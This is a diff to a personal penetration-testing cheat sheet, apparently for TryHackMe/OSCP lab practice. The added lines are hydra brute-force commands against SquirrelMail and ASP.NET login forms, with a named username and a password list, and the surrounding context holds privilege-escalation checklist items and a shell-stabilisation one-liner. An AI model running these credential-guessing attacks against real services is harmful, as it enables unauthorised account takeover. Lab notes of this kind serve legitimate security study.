@@ -69,6 +69,7 @@ dos2unix file
 - lspci -t -v
 - fidlist -l
 - Groups: LXD????
+- crontab
   
 - Shell stabilize
   -  python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -137,3 +138,10 @@ docker exec 7b4294cce723 pandoc OSCP_Report_Steel_Mountail_THM.md \
   - docker system prune
 ```
 
+hydra -l milesdyson -P log1.txt $target http-post-form '/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:quirrelMail - Unknown user or password incorrect.' 
+
+hydra -l milesdyson -P log1.txt $ip http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect" -t 20
+
+
+
+ '/Account/login.aspx:__VIEWSTATE=69yuuyQu%2BFsV858ME9vQPT2LZw6zTdXbSHk3A%2BpwmODQRfrVjVHDJyqKD2jEwtisRgBmegw72mYyWddOv8SbBKXfboHmeJ6uyE9fz%2F0PGi7XvEY%2FBL4FuCFD8KC1ToQMPuotx8rBU5WTryvqCGHd7BXQ1O3r95cK6LRexB05Wbe5SxevwChLklwuogSbnFlmOkZ4vde1YMBy2ZBp%2BoEVR7tuELrzcHoGdl0xKMb8zNINPSGQKKCdIjA6y%2BdpMFTBZukmvHIhdoWpNUyKvV5rLZIjtDnrnv5VuwMtEfIfLBW%2Bl1RvOw6kxTzbS%2B9Q1X3OhKshXBciedwUdsjLj8Q%2Fo5yqN7YSD%2BjCYyvgTe532vXIxSRo&__EVENTVALIDATION=bu7Jb5OyR%2BLA%2FP8nH01STuIGZjnxSHMigCWCJkdcZP11eB7omb%2Be%2Bmo3%2FBTAYLmclw8%2FyUSC6GKgmzbUw1RIujTeng2th885i89lKztlsy9gYH1QQ13t8BvReyN5q9ZHCWV4xV8Nj4FMH%2FGnR8EFXMn74R9lgTdTTS0PmItKQdViP46X&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed' -f -vV -I
